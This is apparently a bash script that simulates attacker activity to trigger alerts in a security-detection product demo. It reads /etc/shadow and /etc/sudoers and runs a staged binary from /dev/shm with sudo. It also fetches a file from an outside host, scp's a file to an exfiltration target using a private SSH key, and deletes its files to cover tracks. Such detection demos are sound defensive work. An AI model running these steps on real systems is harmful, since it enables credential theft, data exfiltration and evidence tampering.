#!/bin/bash

# Load shared variables from config.sh
source "$(dirname "$0")/config.sh"

# Generate some random noise for the Event Analyzer view
/usr/bin/whoami &>/dev/null
/usr/bin/ls &>/dev/null

# Trigger Account Discovery alerts
for i in {1..3}; do
  /usr/bin/groups &>/dev/null
  /usr/bin/getent passwd &>/dev/null
  /bin/cat /etc/sudoers &>/dev/null
  /bin/cat /etc/shadow &>/dev/null
  sleep 3
done

# Copy C programs over and execute
/usr/bin/cp -p $ROOTDIR/files/demo_progs.tar /dev/shm/ &>/dev/null
/usr/bin/tar xf /dev/shm/demo_progs.tar -C /dev/shm/ &>/dev/null
sudo /dev/shm/nothing_to_see_here &>/dev/null

# Trigger Inidcator Match Detection Rules
/usr/bin/curl http://x.com/dlr.ppc &>/dev/null

# Trigger Malware alert with EICAR file
/usr/bin/unzip $ROOTDIR/files/eicar_com.zip &>/dev/null

# Trigger Linux system info discovery rule
for i in {1..4}; do
  /usr/bin/uname -r &>/dev/null
  /usr/bin/uname -o &>/dev/null
  /usr/bin/uname -m &>/dev/null
  /usr/bin/uname -p &>/dev/null
  /usr/bin/uname -a &>/dev/null
  /usr/bin/uname -n &>/dev/null
  sleep 4
done

if [ -f "$FILE" ]; then
  /usr/bin/scp -i $HOMEDIR/.ssh/id_rsa $FILE $EXFILL_TARGET:  
fi

# Remove all files from /dev/shm to cover tracks.
# You can show this in the Event Analyzer, and then show the process still running
# in memory with OSquery
if [ $? -eq 0 ]; then
 /usr/bin/rm -f /dev/shm/{nothing_to_see_here,move_along,demo_progs.tar} &>/dev/null
fi 

exit
